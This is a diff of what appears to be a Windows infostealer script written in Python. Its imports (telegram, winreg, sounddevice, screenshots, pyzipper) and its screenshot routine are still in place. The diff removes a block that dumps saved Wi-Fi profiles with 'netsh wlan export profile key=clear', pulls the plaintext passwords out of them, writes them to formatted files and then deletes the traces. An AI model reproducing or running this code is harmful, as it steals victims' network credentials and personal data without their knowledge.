@@ -1,6 +1,6 @@
 import os, random, datetime, time, sqlite3, logging, shutil, requests
 import zipfile, json, psutil, pyzipper, platform, base64, getpass
-import pywifi, selenium, telegram, subprocess, xml.etree.ElementTree as ET
+import selenium, telegram, subprocess, xml.etree.ElementTree as ET
 import sounddevice as sd, numpy as np, ctypes
 import winreg as reg, threading, asyncio
 
@@ -96,93 +96,6 @@ def screenshot(interval, num_s, o_folder):
         time.sleep(interval)
         
 screenshot(interval=1, num_s=3, o_folder=u_folder)
-
-def convertir_nombre(name):
-    result1 = ''
-    for letter in name:
-        if letter in ma:
-            result1 += ma[letter]
-        elif letter in mi:
-            result1 += mi[letter]
-        elif letter in num:
-            result1 += num[letter]
-        else:
-            result1 += letter
-    return result1
-
-def w_folder(u_folder):
-    w_folder = os.path.join(u_folder, "𝐖𝐢-𝐟𝐢")
-    if not os.path.exists(w_folder):
-        os.makedirs(w_folder)
-    return w_folder
-
-def export_w(w_folder):
-    try:
-        o_file = os.path.join(w_folder, "output.txt")
-        with open(o_file, "w") as output:
-            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", "folder=" + w_folder], stdout=output, stderr=output, check=True)
-        return True
-    except subprocess.CalledProcessError:
-        return False
-
-w_folder = w_folder(u_folder)
-result = export_w(w_folder)
-
-if result:
-    os.remove(os.path.join(w_folder, "output.txt"))
-    
-w_path = r'C:\Users\{user}\𝐔𝐬𝐞𝐫\𝐖𝐢-𝐟𝐢'.format(user=os.getlogin())
-if not os.path.exists(w_path):
-    exit()
-
-for filename in os.listdir(w_path):
-    if filename.endswith(".xml"):
-        file_path = os.path.join(w_path, filename)
-        tree = ET.parse(file_path)
-        root = tree.getroot()
-        profile_name = "N/A"
-        authentication = "N/A"
-        key_type = "N/A"
-        key_material = "N/A"
-        for elem in root.iter():
-            if "name" in elem.tag:
-                profile_name = elem.text if elem.text else "N/A"
-            elif "authentication" in elem.tag:
-                authentication = elem.text if elem.text else "N/A"
-            elif "keyType" in elem.tag:
-                key_type = elem.text if elem.text else "N/A"
-            elif "keyMaterial" in elem.tag:
-                key_material = elem.text if elem.text else "N/A"    
-        converted_name = convertir_nombre(profile_name)
-        o_filename = os.path.splitext(filename)[0] + ".txt"
-        output_path = os.path.join(w_path, converted_name + ".txt")
-        if not os.path.exists(output_path):
-            os.rename(file_path, output_path)
-            with open(output_path, 'w', encoding="utf-8") as o_file:
-                o_file.write(i)
-                o_file.write(s)
-                o_file.write(r)
-                o_file.write(s)
-                o_file.write(f"➤  𝐍𝐚𝐦𝐞: {profile_name}\n")
-                o_file.write(r)
-                o_file.write(s)
-                o_file.write(f"➤  𝐀𝐮𝐭𝐡𝐞𝐧𝐭𝐢𝐜𝐚𝐭𝐢𝐨𝐧: {authentication}\n")
-                o_file.write(r)
-                o_file.write(s)
-                o_file.write(f"➤  𝐊𝐞𝐲𝐓𝐲𝐩𝐞: {key_type}\n")
-                o_file.write(r)
-                o_file.write(s)
-                o_file.write(f"➤  𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: {key_material}\n")
-                o_file.write(r)
-                o_file.write(s)
-
-def delete(folder_p):
-    for filename in os.listdir(folder_p):
-        if filename.endswith(".xml"):
-            file_path = os.path.join(folder_p, filename)
-            os.remove(file_path)
-
-delete(w_folder)
 
 def systeminfo():
     computer_name = os.getenv('COMPUTERNAME')
